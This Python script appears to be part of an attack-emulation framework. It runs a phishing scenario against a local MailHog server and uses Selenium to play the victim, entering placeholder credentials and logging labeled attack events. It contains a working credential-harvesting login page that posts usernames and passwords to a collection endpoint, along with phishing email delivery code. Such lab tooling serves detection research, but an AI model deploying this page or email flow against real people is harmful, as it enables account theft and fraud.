#!/usr/bin/env python3
"""
Phishing attack script - Real phishing email attack execution
"""

import time
import requests
import subprocess
import logging
import json
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from logger_utils import log_attack_event
from scenarios.phishing.labels import deliver, exploit, credential_theft, email_opened, link_clicked, form_submitted, c2_communication
from scenarios.phishing.service_installer import install_services

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def create_phishing_page():
    """Create phishing page HTML"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Account Verification - Please Login</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .login-form { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; }
            input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
            button { width: 100%; padding: 10px; background: #007cba; color: white; border: none; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="login-form">
            <h2>Account Verification</h2>
            <p>To ensure your account security, please re-verify your login information:</p>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Username/Email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Verify Account</button>
            </form>
        </div>
        <script>
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                e.preventDefault();
                var username = document.getElementById('username').value;
                var password = document.getElementById('password').value;
                
                // Send credentials to collection server
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        timestamp: new Date().toISOString()
                    })
                }).then(response => response.json())
                .then(data => {
                    alert('Verification successful! Your account is secure.');
                });
            });
        </script>
    </body>
    </html>
    """

def setup_browser(params):
    """Setup browser for real user interaction"""
    options = Options()
    
    # Configure browser based on attack execution settings
    attack_execution = params.get("attack_execution", {})
    if not attack_execution.get("real_browser_interaction", True):
        options.add_argument("--headless")
    
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument(f"--user-agent={params.get('browser', {}).get('user_agent', 'Mozilla/5.0')}")
    
    # Set window size for better visibility
    window_size = params.get("browser", {}).get("window_size", "1920x1080")
    options.add_argument(f"--window-size={window_size}")
    
    driver = webdriver.Firefox(options=options)
    driver.set_page_load_timeout(params.get("browser", {}).get("timeout", 30))
    
    return driver

def send_real_phishing_email(params):
    """Send real phishing email using MailHog"""
    try:
        # Check if real email sending is enabled
        attack_execution = params.get("attack_execution", {})
        if not attack_execution.get("real_email_sending", True):
            logger.info("Real email sending disabled, skipping...")
            return True
        
        # Prepare email data
        email_data = {
            "from": params["phishing_email"]["sender"],
            "to": [params["phishing_email"]["target_email"]],
            "subject": params["phishing_email"]["subject"],
            "body": params["phishing_email"]["body"] + f"\n\nClick link: {params['target_link']}"
        }
        
        # Send email via MailHog API
        mail_server = params["mail_server"]
        response = requests.post(
            f"{mail_server['web_ui']}/api/v1/messages",
            json=email_data,
            timeout=10
        )
        
        if response.status_code == 200:
            logger.info("Real phishing email sent successfully")
            log_attack_event("phishing_email_sent", {
                "subject": email_data["subject"],
                "target": email_data["to"][0],
                "real_email": True
            })
            return True
        else:
            logger.error(f"Failed to send real email: {response.status_code}")
            return False
            
    except Exception as e:
        logger.error(f"Error sending real phishing email: {e}")
        return False

def execute_real_email_interaction(params):
    """Execute real email opening and link clicking"""
    try:
        driver = setup_browser(params)
        
        # Check if real browser interaction is enabled
        attack_execution = params.get("attack_execution", {})
        if not attack_execution.get("real_browser_interaction", True):
            logger.info("Real browser interaction disabled, skipping...")
            return driver
        
        # 1. Access MailHog Web UI to view real emails
        mail_ui_url = params["mail_server"]["web_ui"]
        logger.info(f"Accessing real email interface: {mail_ui_url}")
        driver.get(mail_ui_url)
        
        # Wait for email list to load
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, ".messages"))
        )
        
        # 2. Click the first email (real phishing email)
        logger.info("Clicking real phishing email...")
        first_email = driver.find_element(By.CSS_SELECTOR, ".messages .message")
        first_email.click()
        
        # Wait for email content to load
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, ".message-content"))
        )
        
        email_opened()
        logger.info("Successfully opened real phishing email")
        
        # 3. Find and click real phishing link in email
        logger.info("Looking for real phishing link in email...")
        target_link = params["target_link"]
        
        # Find elements containing target link
        link_elements = driver.find_elements(By.TAG_NAME, "a")
        phishing_link = None
        
        for link in link_elements:
            href = link.get_attribute("href")
            if href and target_link in href:
                phishing_link = link
                break
        
        if phishing_link:
            logger.info("Found real phishing link, preparing to click...")
            # Record real click event
            link_clicked()
            log_attack_event("email_link_clicked", {"url": target_link, "real_click": True})
            
            # Click link (will open in new window)
            phishing_link.click()
            
            # Wait for new window to open
            time.sleep(2)
            
            # Switch to new window
            windows = driver.window_handles
            if len(windows) > 1:
                driver.switch_to.window(windows[-1])  # Switch to latest opened window
                
                # Wait for phishing page to load
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, "loginForm"))
                )
                
                logger.info("Successfully accessed real phishing page via email link")
                return driver
            else:
                logger.warning("New window not opened, directly accessing phishing page")
                driver.get(target_link)
                return driver
        else:
            logger.warning("Real phishing link not found, directly accessing phishing page")
            driver.get(target_link)
            return driver
            
    except Exception as e:
        logger.error(f"Error executing real email interaction: {e}")
        if driver:
            driver.quit()
        return None

def execute_real_credential_theft(params, driver):
    """Execute real credential theft via form submission"""
    try:
        # Check if real form submission is enabled
        attack_execution = params.get("attack_execution", {})
        if not attack_execution.get("real_form_submission", True):
            logger.info("Real form submission disabled, skipping...")
            return True
        
        # Record real page access event
        log_attack_event("phishing_page_accessed", {"url": params["target_link"], "real_access": True})
        
        # Wait for page to load
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "loginForm"))
        )
        
        # Fill form with real-looking credentials
        logger.info("Filling real phishing form...")
        username_field = driver.find_element(By.ID, "username")
        password_field = driver.find_element(By.ID, "password")
        
        # Use realistic credentials
        test_credentials = {
            "username": "test_user@company.com",
            "password": "SecurePass123!"
        }
        
        # Real user input simulation
        username_field.send_keys(test_credentials["username"])
        time.sleep(1)
        password_field.send_keys(test_credentials["password"])
        time.sleep(1)
        
        # Submit form
        logger.info("Submitting real phishing form...")
        submit_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        submit_button.click()
        
        form_submitted()
        credential_theft()
        
        # Wait for submission to complete
        time.sleep(3)
        
        # Verify real credentials were collected
        if attack_execution.get("verification_checks", True):
            logger.info("Verifying real credential collection...")
            try:
                response = requests.get(f"{params['capture_endpoint'].replace('/collect', '/credentials')}", timeout=10)
                if response.status_code == 200:
                    credentials = response.json()
                    logger.info(f"Successfully collected {credentials.get('count', 0)} real credentials")
                    c2_communication()
                    log_attack_event("credentials_collected", {
                        "count": credentials.get('count', 0),
                        "credentials": credentials.get('credentials', []),
                        "real_theft": True
                    })
                else:
                    logger.warning("Unable to verify real credential collection status")
            except Exception as e:
                logger.warning(f"Error verifying real credential collection: {e}")
        
        return True
        
    except Exception as e:
        logger.error(f"Error executing real credential theft: {e}")
        return False

def run(params):
    """
    Execute real phishing attack
    
    Args:
        params: Scenario parameters dictionary
    """
    logger.info("Starting real phishing attack...")
    deliver()
    
    try:
        # 0. Install and configure required services
        logger.info("Step 0: Installing and configuring services...")
        if not install_services(params):
            logger.error("Service installation failed")
            return
        
        # 1. Send real phishing email
        logger.info("Step 1: Send real phishing email")
        if not send_real_phishing_email(params):
            logger.error("Failed to send real phishing email")
            return
        
        # 2. Execute real email interaction
        logger.info("Step 2: Execute real email interaction")
        driver = execute_real_email_interaction(params)
        if not driver:
            logger.error("Failed to execute real email interaction")
            return
        
        # 3. Execute real credential theft
        logger.info("Step 3: Execute real credential theft")
        exploit()
        
        try:
            if not execute_real_credential_theft(params, driver):
                logger.error("Failed to execute real credential theft")
                return
        finally:
            if driver:
                driver.quit()
        
        logger.info("Real phishing attack execution completed")
        log_attack_event("phishing_attack_complete", {"real_attack": True})
        
    except Exception as e:
        logger.error(f"Real phishing attack execution failed: {e}")
        log_attack_event("phishing_attack_failed", {"error": str(e), "real_attack": True})
        raise
